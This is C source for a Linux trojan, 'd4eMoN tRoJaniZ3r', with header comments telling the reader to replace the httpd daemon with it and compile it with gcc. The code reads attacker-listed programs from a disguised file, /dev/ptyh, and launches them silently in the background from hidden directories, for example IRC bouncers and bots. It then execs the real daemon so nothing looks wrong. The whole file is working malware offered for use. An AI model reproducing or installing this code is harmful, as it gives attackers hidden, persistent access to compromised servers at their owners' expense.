/*	 ......:::: d4eMoN tRoJaniZ3r by DeViLNeT ::::......
 *		      PRIVATE! DO NOT DISTRIBUTE
 *
 *
 * [*] --> c0d3d bY: DeViLNeT
 * [*] ------------> linux@devilnetrulez.com
 * [*] ------------> ircnet/efnet@DeViLNeT
 * [*] --> Gr33tz: ^cthulh^
 * [*] --> D3d: N0b0dY88 
 * [*] --> V3rSion: 0.2
 * [*] --> Test3d oN: Linux
 * 
 * iNst4llati0n: 
 * To install this trojan you must copy the real daemon in another
 * directory !WITH THE SAME NAME!. Then you must copy this file on the
 * real file in its directory.
 * Than you must write in /dev/ptyh all path/commands to execute with
 * daemon. If you must use options with commands you must divide they
 * with the $ character. 
 * Ex:
 *
 * cat /dev/ptyh
 * /home/hacker/. /psybnc			<-- without options
 * /home/hacker/bot/eggdrop$ -m bot.conf -t	<-- whit options
 * /home/hacker/.   $				<-- to run the file ".   " 
 *
 * You can also use spaces in your path and filename.
 * By default you must copy it on /usr/sbin/httpd and put the real
 * httpd deamon in the directory specified in define EXE_PATH
 * that is by default /usr/bin/httpd.
 * ... h3ppY w0rk ...
 *
 * c0mpile w1th: gcc -o dj daemontrojan.c
 */

#include <stdio.h>
#include <stdlib.h>

#define TRJ_PATH        "/dev/ptyh"
#define EXE_PATH        "/usr/bin/httpd"

main (int argc,char **argv,char **envp)
{
char fstr[200],**addr=malloc(200),slas[500],slaw[500];
int i,ic=1,deic,sllen;
FILE *ofile;

if (fork() == 0) {
if ((ofile=fopen(TRJ_PATH,"r"))==NULL) { exit(0); }
while (!feof(ofile)) {
	fgets(fstr, 200, ofile);
	for (i=0; i<strlen(fstr); i++) if (fstr[i]=='\n') fstr[i]='\0';
	addr[ic]=malloc(200);
	strcpy(addr[ic],fstr);
	ic++;
	}
deic=ic-2; ic=0;
while (ic!=deic) {
	ic++;
	i=0;
	memset(slaw, 0, 500);
	strcpy(slas,addr[ic]);
	sllen=strlen(slas);
	while (i!=sllen) {
	   if (slas[i]=='$') { 
		(slas[i]='"'); 
		goto out; }
	   else i++;
	}
	out:
	if (sllen==i) strcat(slas,"\"");
	strncpy(slaw,slas,i);
	if ((ofile=fopen(slaw,"r"))==NULL) { exit(0); }
	strcpy(addr[ic],slas);
	strcpy(addr[ic],"cd \"");
	while (sllen!=0) {
	   if (slas[sllen]=='/') goto out2;
	   else sllen--;
	}
	out2:
	strncat(addr[ic],slas,sllen);
	strcat(addr[ic],"\" && \".");
	strcat(addr[ic],slas+sllen); 
	strcat(addr[ic]," 1>/dev/null 2>/dev/null &");
	system(addr[ic]);
	}
exit(0);
   }
if ((ofile=fopen(EXE_PATH,"r"))==NULL) {
	printf("bash: %s: No such file or directory\n",EXE_PATH); }
execve(EXE_PATH, argv, envp);
}
